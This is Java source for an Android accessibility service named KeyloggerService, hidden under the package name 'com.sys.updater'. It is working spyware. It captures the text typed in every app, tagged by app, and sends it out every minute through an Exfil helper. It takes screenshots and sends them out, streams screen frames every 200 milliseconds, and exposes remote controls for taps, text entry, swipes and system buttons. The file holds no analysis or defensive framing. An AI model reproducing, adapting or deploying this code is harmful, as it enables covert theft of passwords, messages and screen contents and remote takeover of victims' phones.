package com.sys.updater;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityService.ScreenshotResult;
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class KeyloggerService extends AccessibilityService {
    
    public static KeyloggerService instance = null;
    public static byte[] latestFrame = null;
    public static boolean isLiveStreaming = false;

    private String currentPackage = "";
    private StringBuilder buffer = new StringBuilder();
    private Timer flushTimer, streamTimer;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        
        flushTimer = new Timer();
        flushTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                flushBuffer();
            }
        }, 60000, 60000);

        streamTimer = new Timer();
        streamTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (isLiveStreaming) {
                    takeLiveScreenshot();
                }
            }
        }, 0, 200);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "unknown";
        
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!pkg.equals(currentPackage) && !pkg.equals("com.android.systemui")) {
                flushBuffer();
                currentPackage = pkg;
                buffer.append("\n\n=== [").append(pkg).append("] ===\n");
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> text = event.getText();
            if (text != null && !text.isEmpty()) {
                buffer.append("> ").append(text.get(0).toString()).append("\n");
            }
        }
    }

    private synchronized void flushBuffer() {
        if (buffer.length() > 0) {
            String data = buffer.toString();
            if (data.length() > 4000) data = data.substring(data.length() - 4000);
            Exfil.send("KEYLOG:\n" + data);
            buffer.setLength(0);
        }
    }

    // ================== SMART GHOST TOUCH ==================

    public boolean performClick(String textToFind) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByText(textToFind);
        for (AccessibilityNodeInfo node : nodes) {
            if (node.isClickable()) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                return true;
            } else {
                AccessibilityNodeInfo parent = node.getParent();
                if (parent != null && parent.isClickable()) {
                    parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    return true;
                }
            }
        }
        return false;
    }

    public boolean performSetText(String text) {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return false;
        
        AccessibilityNodeInfo focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focusedNode != null) {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
            return true;
        }
        return false;
    }

    public void performSwipe(String direction) {
        WindowManager wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        DisplayMetrics metrics = new DisplayMetrics();
        wm.getDefaultDisplay().getMetrics(metrics);
        int width = metrics.widthPixels;
        int height = metrics.heightPixels;

        Path path = new Path();
        if (direction.equalsIgnoreCase("up")) {
            path.moveTo(width / 2f, height * 0.8f);
            path.lineTo(width / 2f, height * 0.2f);
        } else if (direction.equalsIgnoreCase("down")) {
            path.moveTo(width / 2f, height * 0.2f);
            path.lineTo(width / 2f, height * 0.8f);
        } else if (direction.equalsIgnoreCase("left")) {
            path.moveTo(width * 0.8f, height / 2f);
            path.lineTo(width * 0.2f, height / 2f);
        } else if (direction.equalsIgnoreCase("right")) {
            path.moveTo(width * 0.2f, height / 2f);
            path.lineTo(width * 0.8f, height / 2f);
        } else {
            return;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(path, 0, 300));
            dispatchGesture(builder.build(), null, null);
        }
    }

    public void pressBack() { performGlobalAction(GLOBAL_ACTION_BACK); }
    public void pressHome() { performGlobalAction(GLOBAL_ACTION_HOME); }
    public void pressRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }
    public void openNotifications() { performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS); }

    // ================== SCREENSHOTS ==================

    public void captureScreen() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        File file = new File(getExternalFilesDir(null), "screenshot.jpg");
                        FileOutputStream fos = new FileOutputStream(file);
                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        fos.close(); buffer.close();
                        Exfil.sendFile(file.getAbsolutePath(), "Photo", "Screen Capture");
                    } catch (Exception e) {}
                }
                @Override public void onFailure(int errorCode) {}
            });
        }
    }

    private void takeLiveScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(), new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, screenshotResult.getColorSpace());
                        if (bitmap == null) { buffer.close(); return; }
                        Bitmap resized = Bitmap.createScaledBitmap(bitmap, 480, 800, true);
                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        resized.compress(Bitmap.CompressFormat.JPEG, 30, baos);
                        latestFrame = baos.toByteArray();
                        buffer.close();
                    } catch (Exception e) {}
                }
                @Override public void onFailure(int errorCode) {}
            });
        }
    }

    @Override public void onInterrupt() { instance = null; }
    @Override public void onDestroy() { instance = null; super.onDestroy(); }
                            }
